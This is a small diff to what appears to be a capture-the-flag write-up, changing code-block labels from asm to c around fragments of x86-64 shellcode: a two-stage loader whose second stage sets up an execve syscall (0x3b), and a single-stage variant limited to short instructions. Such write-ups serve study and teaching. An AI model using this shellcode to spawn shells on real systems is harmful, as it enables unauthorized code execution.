@@ -9,7 +9,7 @@ This is the first solution I came up with. It's not the best one, but it works. 
 
 ### First Stage
 
-```asm
+```c
 xor edi, edi
 push rdx
 pop rsi
@@ -26,7 +26,7 @@ syscall
 
 ### Second Stage
 
-```asm
+```c
 mov rdi, rsi
 add rdi, 0x22
 mov rax, 0x3b
@@ -47,7 +47,7 @@ Note: Why 0x22? Because the first stage is 12 byte long. The second one 22. Then
 
 This is the second solution I came up with. It's better than the first one because it's a single stage exploit. The shellcode doesn't contain instructions with more than 2 bytes.
 
-```asm
+```c
 push rdx
 pop rax
 add al, 0x10
